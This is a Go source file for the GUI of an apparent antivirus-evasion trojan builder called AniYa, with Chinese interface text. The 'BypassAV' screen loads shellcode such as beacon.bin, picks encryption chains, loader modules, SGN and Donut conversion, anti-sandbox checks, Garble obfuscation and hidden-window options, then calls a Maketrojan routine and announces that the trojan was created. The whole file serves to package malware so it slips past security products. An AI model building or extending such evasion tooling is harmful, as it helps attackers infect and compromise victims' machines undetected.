package themes

import (
	"AniYa/core"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
	"log"
	"os"
	"reflect"
)

var (
	infProgress *widget.ProgressBarInfinite

	antisandboxopt = core.Antisandboxopt{
		Timestart:      false,
		Ramcheck:       false,
		Cpunumbercheck: false,
		Wechatcheck:    false,
		Disksizecheck:  false,
	}
	buildopt = core.Buildopt{
		Garble:     false,
		Upx:        false,
		Literalobf: false,
		Seedrandom: false,
		Race:       false,
		Hide:       false,
	}
	Tmpgopt = core.Gopt{
		Module:            "",
		Srcfile:           "beacon.bin",
		Dstfile:           "result.exe",
		Shellcodeencode:   "",
		Sgn:               false,
		Donut:             false,
		Fenli:             false,
		Shellcodelocation: "",
		Antisandboxopt:    antisandboxopt,
		Buildopt:          buildopt,
	}
)

func BypassAV(win fyne.Window) fyne.CanvasObject {
	var filesrcName string
	BypassFileEntry := widget.NewEntry()
	BypassFileEntry.SetText("beacon.bin")
	BypassFileButton := widget.NewButton("File", func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, win)
				return
			}
			if reader == nil {
				log.Println("Cancelled")
				return
			}
			//filesrcName = reader.URI().Path()
			filesrcName = reader.URI().Path()
			ext := reader.URI().Extension()
			println(ext)
			if ext != ".txt" && ext != ".bin" && ext != ".exe" && ext != ".dll" {
				dialog.ShowInformation("Error!", "请选择exe、dll、bin、txt格式的文件！", win)
				return
			}
			if ext == ".exe" || ext == ".dll" {
				Tmpgopt.Donut = true
			}
			Tmpgopt.Srcfile = filesrcName
			BypassFileEntry.SetText(filesrcName)
			println(Tmpgopt.Donut)
		}, win)
		//设置默认位置为当前路径
		pwd, _ := os.Getwd()
		nowfileURI := storage.NewFileURI(pwd)
		listerURI, _ := storage.ListerForURI(nowfileURI)
		fd.SetLocation(listerURI)
		fd.Resize(fyne.NewSize(600, 480))
		//fd.SetFilter(storage.NewExtensionFileFilter([]string{".bin", ".txt", ".exe", ".dll"}))
		fd.Show()
	})
	infProgress = widget.NewProgressBarInfinite()
	infProgress.Stop()
	middle := widget.NewLabel("Final Trojan Name")
	TrojanNameEntry := widget.NewEntry()
	TrojanNameEntry.SetPlaceHolder("result.exe")
	TrojanNameEntry.SetText("result.exe")
	SelectFileV := container.NewBorder(nil, nil, BypassFileButton, nil, BypassFileEntry)
	TrojanFileV := container.NewBorder(nil, nil, middle, nil, TrojanNameEntry)

	keys := reflect.ValueOf(core.Modules).MapKeys()
	loaderTmp := make([]string, 0)
	for _, lt := range keys {
		loaderTmp = append(loaderTmp, lt.String())
	}

	BypassMixEntry := widget.NewEntry()
	BypassMixEntry.SetPlaceHolder("Key")

	shellcodeProcess := widget.NewSelect([]string{"xor+hex+base85", "xor+rc4+hex+base85", "rc4+hex+base85"}, func(s string) {
		Tmpgopt.Shellcodeencode = s
	})
	shellcodeProcess.PlaceHolder = "Shellcode way"
	selectLoderEntry := widget.NewSelect(loaderTmp, func(s string) {
		Tmpgopt.Module = s
	})
	selectLoderEntry.PlaceHolder = "Loader type"
	sandboxType := make([]string, 0)
	sandboxlist := reflect.TypeOf(antisandboxopt)
	sandboxlistnum := sandboxlist.NumField()
	for i := 0; i < sandboxlistnum; i++ {
		sandboxType = append(sandboxType, sandboxlist.Field(i).Name)
	}

	fmt.Printf("%v", sandboxType)
	BypassSanboxNumEntry := widget.NewEntry()
	BypassSanboxNumEntry.SetPlaceHolder("Sandbox ways")

	//建立反沙箱选项的标签
	sandboxlabel := widget.NewLabel("反  沙  箱  选  项  ：")
	//挨个建立check建立反沙箱选项

	sandboxcheck1 := widget.NewCheck(sandboxType[0], func(b bool) {
		Tmpgopt.Antisandboxopt.Timestart = b
	})
	sandboxcheck2 := widget.NewCheck(sandboxType[1], func(b bool) {
		Tmpgopt.Antisandboxopt.Ramcheck = b
	})
	sandboxcheck3 := widget.NewCheck(sandboxType[2], func(b bool) {
		Tmpgopt.Antisandboxopt.Cpunumbercheck = b
	})
	sandboxcheck4 := widget.NewCheck(sandboxType[3], func(b bool) {
		Tmpgopt.Antisandboxopt.Wechatcheck = b
	})
	sandboxcheck5 := widget.NewCheck(sandboxType[4], func(b bool) {
		Tmpgopt.Antisandboxopt.Disksizecheck = b
	})
	sandboxselectall := widget.NewCheck("select all", func(b bool) {
		sandboxcheck1.SetChecked(b)
		sandboxcheck2.SetChecked(b)
		sandboxcheck3.SetChecked(b)
		sandboxcheck4.SetChecked(b)
		sandboxcheck5.SetChecked(b)
	})
	sandboxV := container.NewGridWithColumns(6, sandboxselectall, sandboxcheck1, sandboxcheck2, sandboxcheck3, sandboxcheck4, sandboxcheck5)

	checkSgn := widget.NewCheck("Sgn", func(on bool) { Tmpgopt.Sgn = on })
	checkSgn.MinSize()

	//构建编译选项说明
	buildlabel := widget.NewLabel("编  译  选  项  ：")
	//buildlabel.Hide()

	// 构建 build opt 多选框
	buildcheck1 := widget.NewCheck("Race", func(b bool) {
		Tmpgopt.Buildopt.Race = b
	})
	buildcheck2 := widget.NewCheck("Hide", func(b bool) {
		Tmpgopt.Buildopt.Hide = b
	})
	buildcheck3 := widget.NewCheck("Literalobf", func(b bool) {
		Tmpgopt.Buildopt.Literalobf = b
	})
	buildcheck4 := widget.NewCheck("randomseed", func(b bool) {
		Tmpgopt.Buildopt.Seedrandom = b
	})
	buildcheck3.Hide()
	buildcheck4.Hide()

	shellcodeProcess.PlaceHolder = "Shellcode way"

	checkGarble := widget.NewCheck("Garble", func(on bool) {
		Tmpgopt.Buildopt.Garble = on
		if on {
			buildcheck3.Show()
			buildcheck4.Show()
		} else {
			buildcheck3.Hide()
			buildcheck4.Hide()
		}

	})
	//BypassSelectV2 := container.NewHBox(checkSgn, checkGarble)
	BypassSelectV := container.NewBorder(nil, nil, checkSgn, nil, container.NewGridWithColumns(2, shellcodeProcess, selectLoderEntry))
	//checkSgn.MinSize()

	buildboxV := container.NewGridWithColumns(5, checkGarble, buildcheck1, buildcheck2, buildcheck3, buildcheck4)
	//分离免杀UI设计
	fenlilocationtext := widget.NewEntry()
	fenlilocationtext.SetPlaceHolder("分离的shellcode文件")
	fenlilocationtext.SetText("分离的shellcode文件")
	fenlilocationlabel := widget.NewLabel("分离的shellcode存放位置")
	fenlilocation := container.NewBorder(nil, nil, fenlilocationlabel, nil, fenlilocationtext)
	fenlilocation.Hide()
	fenlicheck := widget.NewCheck("分离免杀", func(b bool) {
		Tmpgopt.Fenli = b
		switch b {
		case true:
			fenlilocation.Show()
		case false:
			fenlilocation.Hide()
		}
	})
	//增强功能UI设计
	//advancedchecklabel := widget.NewLabel("增 强 功 能 ：")
	//advancedcheck1 := widget.NewCheck("末尾添加垃圾数据过WD", func(b bool) {
	//	Tmpgopt.Advancedopt.Addextradata = b
	//})
	//advancedcheck2 := widget.NewCheck("unhook", func(b bool) {
	//	Tmpgopt.Advancedopt.Unhook = b
	//})
	//advancedcheck3 := widget.NewCheck("gate", func(b bool) {
	//	Tmpgopt.Advancedopt.Gate = b
	//})
	//advancedgroup := container.NewGridWithColumns(3, advancedcheck1, advancedcheck2, advancedcheck3)

	//生成按钮设计
	BypassStartButton := widget.NewButton("<<<<<<< Create >>>>>>>", func() {
		if Tmpgopt.Module == "" || Tmpgopt.Shellcodeencode == "" {
			dialog.ShowInformation("Error！", "请至少选择shellcode加密方式和loader的模组", win)
			return
		}
		infProgress.Start()
		Tmpgopt.Dstfile = TrojanNameEntry.Text
		Tmpgopt.Shellcodelocation = fenlilocationtext.Text
		Startway()
		infProgress.Stop()
		dialog.ShowInformation("success!", "木马生成成功！检查当前目录下"+TrojanNameEntry.Text, win)
	})
	return container.NewVBox(
		SelectFileV,
		TrojanFileV,
		fenlicheck,
		fenlilocation,
		BypassSelectV,
		//BypassSelectV2,
		sandboxlabel,
		sandboxV,
		buildlabel,
		buildboxV,
		//advancedchecklabel,
		//advancedgroup,
		BypassStartButton,
		infProgress)
}

func Startway() {
	//fmt.Printf("%v", &Tmpgopt)
	core.Maketrojan(Tmpgopt)
}
